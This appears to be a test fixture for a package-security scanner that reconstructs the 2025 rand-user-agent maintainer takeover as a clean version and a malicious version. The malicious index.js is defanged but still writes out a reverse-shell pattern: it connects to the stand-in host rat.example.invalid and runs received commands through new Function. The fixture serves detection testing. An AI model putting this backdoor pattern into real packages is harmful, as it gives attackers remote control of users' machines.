/**
 * rand-user-agent (May 2025) — T1 maintainer takeover.
 *
 * Attacker published a malicious version of the rand-user-agent package with
 * a RAT payload that opened a reverse shell to attacker C2. The payload was
 * heavily obfuscated (multi-layer string-decoding chains).
 *
 * Detection: new net.connect / socket, dynamic-loading (Function constructor
 * for the decoder), obfuscation entropy jump.
 */

import type { FixtureSpec } from '../fixture-spec.js';

const CLEAN_INDEX = `// rand-user-agent 2.0.0 — returns a random UA string.
'use strict';
var UAS = ['Mozilla/5.0 (X11; Linux)', 'Mozilla/5.0 (Windows NT 10.0)'];
module.exports = function() { return UAS[Math.floor(Math.random() * UAS.length)]; };
`;

const OBF_BLOB = 'X19fZGVmYW5nZWRfcGF5bG9hZF9YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWA==';

const MAL_INDEX = `'use strict';
var net = require('net');
var _p = '${OBF_BLOB}';
function _d(x) { return Buffer.from(x, 'base64').toString(); }
if (false) {
  var s = net.connect(4444, 'rat.example.invalid');
  s.on('data', function(cmd) {
    try { new Function(_d(_p) + cmd.toString())(); } catch(e) {}
  });
}
var UAS = ['Mozilla/5.0 (X11; Linux)', 'Mozilla/5.0 (Windows NT 10.0)'];
module.exports = function() { return UAS[Math.floor(Math.random() * UAS.length)]; };
`;

export const spec: FixtureSpec = {
  id: 'rand-user-agent-2025',
  title: 'rand-user-agent (May 2025)',
  year: 2025,
  threatClass: 'T1 maintainer takeover',
  summary:
    'Malicious version of rand-user-agent opened a reverse shell (net.connect) to a C2 host and executed remote commands via new Function(). Payload used base64 layers of obfuscation.',
  provenance: 'RECONSTRUCTED',
  topology: 'direct',
  clean: {
    name: 'rand-user-agent',
    version: '2.0.0',
    manifest: {
      name: 'rand-user-agent',
      version: '2.0.0',
      main: 'index.js',
      license: 'MIT',
      maintainers: [{ email: 'orig@example' }],
    },
    files: { 'index.js': CLEAN_INDEX },
  },
  malicious: {
    name: 'rand-user-agent',
    version: '2.0.1',
    manifest: {
      name: 'rand-user-agent',
      version: '2.0.1',
      main: 'index.js',
      license: 'MIT',
      maintainers: [{ email: 'orig@example' }],
      _npmUser: { name: 'rat-actor', email: 'rat@example.invalid' },
    },
    files: { 'index.js': MAL_INDEX },
  },
  expect: {
    mustFire: [
      'net.new-module',                // 'net' — added
      'code.dynamic-loading-added',    // new Function()
      'net.new-endpoint',              // rat host domain literal
    ],
    verdict: 'BLOCK',
    minCategories: ['NET', 'CODE'],
  },
};
